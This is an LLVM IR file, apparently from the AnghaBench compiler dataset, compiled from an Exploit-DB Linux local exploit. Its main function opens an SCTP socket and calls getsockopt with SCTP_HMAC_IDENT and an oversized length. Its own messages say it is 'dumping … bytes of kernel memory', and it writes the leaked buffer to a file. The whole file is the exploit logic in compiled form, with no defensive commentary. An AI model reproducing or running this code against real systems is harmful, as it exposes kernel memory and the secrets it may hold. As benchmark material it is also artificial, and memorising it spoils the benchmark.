; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_7618.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_7618.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DUMP_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [17 x i8] c"malloc(3) failed\00", align 1
@.str.1 = private unnamed_addr constant [20 x i8] c"[-] Error: %s (%s)\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [34 x i8] c"[+] creating IPPROTO_SCTP socket\0A\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_SCTP = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [17 x i8] c"socket(2) failed\00", align 1
@.str.4 = private unnamed_addr constant [61 x i8] c"[+] getting socket option SCTP_HMAC_IDENT with length of %d\0A\00", align 1
@SOL_SCTP = common dso_local global i32 0, align 4
@SCTP_HMAC_IDENT = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [21 x i8] c"getsockopt(2) failed\00", align 1
@.str.6 = private unnamed_addr constant [45 x i8] c"[+] dumping %d bytes of kernel memory to %s\0A\00", align 1
@DUMP_FILE = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"fopen(3) failed\00", align 1
@.str.9 = private unnamed_addr constant [11 x i8] c"[+] done.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @DUMP_SIZE, align 4
  store i32 %12, i32* %11, align 4
  %13 = load i32, i32* @DUMP_SIZE, align 4
  %14 = call i8* @malloc(i32 %13)
  store i8* %14, i8** %9, align 8
  %15 = load i8*, i8** %9, align 8
  %16 = icmp ne i8* %15, null
  br i1 %16, label %22, label %17

17:                                               ; preds = %2
  store i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0), i8** %10, align 8
  %18 = load i8*, i8** %10, align 8
  %19 = load i32, i32* @errno, align 4
  %20 = call i8* @strerror(i32 %19)
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0), i8* %18, i8* %20)
  store i32 1, i32* %3, align 4
  br label %74

22:                                               ; preds = %2
  %23 = load i8*, i8** %9, align 8
  %24 = load i32, i32* @DUMP_SIZE, align 4
  %25 = call i32 @memset(i8* %23, i32 0, i32 %24)
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.2, i64 0, i64 0))
  %27 = load i32, i32* @PF_INET, align 4
  %28 = load i32, i32* @SOCK_STREAM, align 4
  %29 = load i32, i32* @IPPROTO_SCTP, align 4
  %30 = call i32 @socket(i32 %27, i32 %28, i32 %29)
  store i32 %30, i32* %7, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %33, label %38

33:                                               ; preds = %22
  store i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0), i8** %10, align 8
  %34 = load i8*, i8** %10, align 8
  %35 = load i32, i32* @errno, align 4
  %36 = call i8* @strerror(i32 %35)
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0), i8* %34, i8* %36)
  store i32 1, i32* %3, align 4
  br label %74

38:                                               ; preds = %22
  %39 = load i32, i32* %11, align 4
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.4, i64 0, i64 0), i32 %39)
  %41 = load i32, i32* %7, align 4
  %42 = load i32, i32* @SOL_SCTP, align 4
  %43 = load i32, i32* @SCTP_HMAC_IDENT, align 4
  %44 = load i8*, i8** %9, align 8
  %45 = call i32 @getsockopt(i32 %41, i32 %42, i32 %43, i8* %44, i32* %11)
  store i32 %45, i32* %6, align 4
  %46 = load i32, i32* %6, align 4
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %53

48:                                               ; preds = %38
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i64 0, i64 0), i8** %10, align 8
  %49 = load i8*, i8** %10, align 8
  %50 = load i32, i32* @errno, align 4
  %51 = call i8* @strerror(i32 %50)
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0), i8* %49, i8* %51)
  store i32 1, i32* %3, align 4
  br label %74

53:                                               ; preds = %38
  %54 = load i32, i32* %11, align 4
  %55 = load i8*, i8** @DUMP_FILE, align 8
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.6, i64 0, i64 0), i32 %54, i8* %55)
  %57 = load i8*, i8** @DUMP_FILE, align 8
  %58 = call i32* @fopen(i8* %57, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  store i32* %58, i32** %8, align 8
  %59 = load i32*, i32** %8, align 8
  %60 = icmp ne i32* %59, null
  br i1 %60, label %66, label %61

61:                                               ; preds = %53
  store i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i64 0, i64 0), i8** %10, align 8
  %62 = load i8*, i8** %10, align 8
  %63 = load i32, i32* @errno, align 4
  %64 = call i8* @strerror(i32 %63)
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0), i8* %62, i8* %64)
  store i32 1, i32* %3, align 4
  br label %74

66:                                               ; preds = %53
  %67 = load i8*, i8** %9, align 8
  %68 = load i32, i32* %11, align 4
  %69 = load i32*, i32** %8, align 8
  %70 = call i32 @fwrite(i8* %67, i32 1, i32 %68, i32* %69)
  %71 = load i32*, i32** %8, align 8
  %72 = call i32 @fclose(i32* %71)
  %73 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.9, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %74

74:                                               ; preds = %66, %61, %48, %33, %17
  %75 = load i32, i32* %3, align 4
  ret i32 %75
}

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @strerror(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
